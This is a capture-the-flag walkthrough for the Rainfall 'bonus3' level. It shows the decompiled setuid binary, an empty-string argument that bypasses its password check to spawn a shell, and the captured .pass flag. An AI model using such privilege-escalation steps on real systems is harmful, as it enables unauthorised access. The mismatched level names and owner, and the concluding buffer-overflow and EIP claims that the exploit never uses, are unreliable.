## Walk-through Bonus1

### Introduction
Bonus3 is part of the Rainfall challenge series, where the goal is to escalate privileges by exploiting a vulnerable binary. This walk-through covers analyzing the binary, identifying vulnerabilities, and obtaining elevated access.

### Binary Information
The target binary is a 32-bit ELF executable with setuid permissions. This means that when executed, it runs with the privileges of its owner (bonus2), allowing for privilege escalation if exploited successfully.

### Security Checks
Checking the binary’s security protections:
```bash
bonus3@RainFall:~$ checksec --file bonus3
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   bonus3
```
Observations:
- **No RELRO:** No read-only relocation, meaning GOT entries can be modified.
- **No stack canary:** No protection against buffer overflow.
- **NX enable:** The stack is not executable, not allowing shellcode execution.
- **No PIE:** The binary is not position-independent, meaning addresses are static.

### Source Code Analysis
The binary’s decompiled source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

typedef unsigned char byte;

int main(int argc, char **argv)

{
  int iVar1;
  char *puVar2;
  byte bVar3;
  char local_98[16];
  char local_57;
  char local_56[66];
  FILE *local_14;

  bVar3 = 0;
  local_14 = fopen("/home/user/end/.pass", "r");
  puVar2 = local_98;
  for (iVar1 = 0x21; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + (uint)bVar3 * -2 + 1;
  }
  if ((local_14 == (FILE *)0x0) || (argc != 2)) {
    iVar1 = -1;
  } else {
    fread(local_98, 1, 0x42, local_14);
    local_57 = 0;
    iVar1 = atoi(argv[1]);
    *(char *)(local_98 + iVar1) = 0;
    fread(local_56, 1, 0x41, local_14);
    fclose(local_14);
    iVar1 = strcmp((char *)local_98, argv[1]);
    if (iVar1 == 0) {
      execl("/bin/sh", "sh", 0);
    } else {
      puts(local_56);
    }
    iVar1 = 0;
  }
  return iVar1;
}
```

The program reads a password file (.pass) and compares user input against the file's contents. If the input matches, it spawns a shell (/bin/sh). However, the code contains several vulnerabilities that allow an attacker to bypass the password check and gain shell access.

### Exploitation Strategy

If we examine the source code, we notice that *(char *)(local_98 + iVar1) = 0; is equivalent to local_98[iVar1] = 0;. Since iVar1 is assigned the value of atoi(argv[1]), passing an empty string ("") as an argument results in atoi(""), which returns 0. This leads to strcmp("", ""), which evaluates to 0, causing the if condition to be triggered.


### Gaining Access

```bash
bonus3@RainFall:~$ ./bonus3 ""
$ id
uid=2013(bonus3) gid=2013(bonus3) euid=2014(end) egid=100(users) groups=2014(end),100(users),2013(bonus3)
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
$
```
### Mitigation Strategies
* **Enable** stack canaries to detect buffer overflows.
* Implement bounds checking on user input.
* Enable **ASLR** and NX bit to prevent predictable memory layouts and execution of injected shellcode.
### Conclusion
This challenge demonstrates classic buffer overflow exploitation by overwriting EIP to redirect execution. Understanding binary protections and manual debugging in GDB are crucial for developing exploitation skills.

